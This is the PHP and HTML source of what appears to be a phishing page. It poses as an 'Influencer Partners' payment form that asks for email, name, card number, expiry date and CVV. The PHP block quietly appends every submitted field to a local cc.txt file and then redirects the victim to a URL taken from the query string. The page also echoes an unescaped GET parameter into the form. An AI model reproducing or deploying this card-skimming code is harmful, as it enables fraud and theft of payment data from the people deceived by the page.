<?php

  if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $cc_info = "";

    foreach ($_POST as $key => $value) {
      $cc_info .= ucfirst($key).": ".$value."\n";
    }
    
    file_put_contents('cc.txt', $cc_info . $br, FILE_APPEND);

    $newURL = explode('cc/index.php', $_SERVER['PHP_SELF'])[0] . $_GET['url'];
    // echo('URL: '.$newURL);
    header('Location: '.$newURL);
    die();
  }

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Payment Method</title>

  <link rel="shortcut icon" type="image/x-icon" href="favicon.webp" sizes="48x48">
  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <!-- Add Dark Bootstrap theme CSS link -->
  <link rel="stylesheet" href="https://bootswatch.com/5/sketchy/bootstrap.min.css">

  <!-- Font Awesome icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

  <!-- Custom CSS -->
  <style>
    .payment-icons i {
      font-size: 30px;
      margin-right: 10px;
    }
    .footer {
      background-color: #f8f9fa;
      padding: 20px;
      text-align: center;
      font-size: 14px;
    }
    .footer a {
      margin: 0 10px;
      color: #343a40;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>Enter Payment Method</h1>
    <p>This information is required in order to be able to receive payments.</p>
    <hr>

    <form action="" method="post">
      <div class="form-group">
        <label for="email">Email</label>
        <input type="email" class="form-control" id="email" name="email" placeholder="Enter your email" <?php if(isset($_GET['email'])) { echo("value=" . $_GET['email']); } ?> required>
      </div>

      <div class="form-group">
        <label for="name">Name</label>
        <input type="text" class="form-control" id="name" name="name" placeholder="Enter name as appears on Card" required>
      </div>

      <div class="form-group">
        <label for="cardNumber">Credit Card Number</label>
        <input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" size="18" minlength="16" maxlength="19" required>
      </div>

      <div class="form-row">
        <div class="form-group col-md-6">
          <label for="expiryDate">Expiry Date</label>
          <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="MM/YY" size="6" minlength="4" maxlength="4" required>
        </div>
        <div class="form-group col-md-6">
          <label for="cvv">CVV/CVC</label>
          <input type="text" class="form-control" id="cvv" name="cvv" placeholder="000" size="1" minlength="3" maxlength="3" required>
        </div>
      </div>

      <div class="form-group">
        <label for="paymentMethod">Payment Method</label>
        <div class="payment-icons">
          <i class="fab fa-cc-visa"></i>
          <i class="fab fa-cc-mastercard"></i>
          <i class="fab fa-paypal"></i>
        </div>
        <select class="form-control" id="paymentMethod" name="paymentMethod">
          <option value="visa">Visa</option>
          <option value="mastercard">Mastercard</option>
          <option value="paypal">PayPal</option>
        </select>
      </div>

      <button type="submit" class="btn btn-primary">Submit Information</button>
    </form>
  </div>
  	<hr>
	<footer class="footer">
		<div class="container">
		  <p>© 2022-2023 Influencer Partners</p>
		  <p>
		    <a href="#">Privacy</a>
		    <a href="#">Terms</a>
		    <a href="#">Support</a>
		  </p>
		</div>
	</footer>
	<!-- Sanitize Input script -->
  <script src="script.js"></script>
  <!-- Bootstrap JS -->
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

  <!-- Font Awesome JS -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script>
</body>

</html>
